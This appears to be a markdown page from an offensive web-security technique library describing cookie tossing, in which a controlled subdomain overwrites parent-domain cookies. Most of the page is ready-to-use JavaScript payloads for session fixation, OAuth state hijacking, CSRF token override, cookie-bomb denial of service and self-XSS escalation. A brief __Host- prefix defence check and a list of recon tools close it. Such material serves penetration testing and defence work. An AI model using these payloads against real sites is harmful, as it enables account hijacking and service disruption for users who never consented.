---
id: "cookie-tossing"
title: "Cookie Tossing Attacks"
type: "technique"
category: "web-application"
subcategory: "session"
tags: ["cookie-tossing", "session-fixation", "subdomain", "csrf-bypass", "oauth-hijack"]
platforms: ["linux", "macos", "windows"]
related: ["auth-session-attacks", "subdomain-takeover", "cors-misconfiguration"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Cookie Tossing Attacks

## How It Works
A subdomain can set cookies for the parent domain. If attacker controls any subdomain (XSS, takeover), they can inject/override cookies on the parent domain.

## Session Fixation via Cookie Tossing
```javascript
// From evil.subdomain.target.com or XSS on any subdomain:
document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/; Secure";
// Victim now uses attacker's session
// Victim logs in → attacker's session has victim's auth
```

## OAuth State Hijacking
```javascript
// Poison the OAuth state cookie:
document.cookie = "oauth_state=ATTACKER_STATE; domain=.target.com; path=/auth/callback";
// Victim completes OAuth → callback validates attacker's state
// → links victim's OAuth account to attacker's session
```

## CSRF Token Override (Double-Submit Pattern)
```javascript
// If CSRF uses double-submit cookies:
document.cookie = "csrf_token=KNOWN_VALUE; domain=.target.com; path=/";
// Attacker knows the CSRF token → can craft CSRF attacks
```

## Cookie Bombing (DoS)
```javascript
// Exceed server header size limit:
for (var i = 0; i < 100; i++) {
  document.cookie = "bomb" + i + "=" + "A".repeat(4000) + "; domain=.target.com; path=/";
}
// Server returns 413 or 400 → DoS for victim on parent domain
```

## Self-XSS Escalation
```javascript
// Fixate victim to attacker's session where XSS payload is planted:
document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/vulnerable-page";
// Victim visits page → sees attacker's account → XSS fires in victim's browser
```

## Defense Check
```
__Host- prefix: Cannot be set from subdomains, requires Secure, no Domain, Path=/
__Secure- prefix: Must have Secure flag (weaker)
If app doesn't use __Host- prefix → cookie tossing possible
```

## Where to Find This
- Apps with user-controlled subdomains (user.platform.com)
- Subdomain takeover vulnerabilities
- XSS on any subdomain
- Apps not using __Host- cookie prefix

## Tools
- subfinder/amass (subdomain enumeration)
- nuclei (subdomain takeover templates)
- Browser DevTools → Application → Cookies
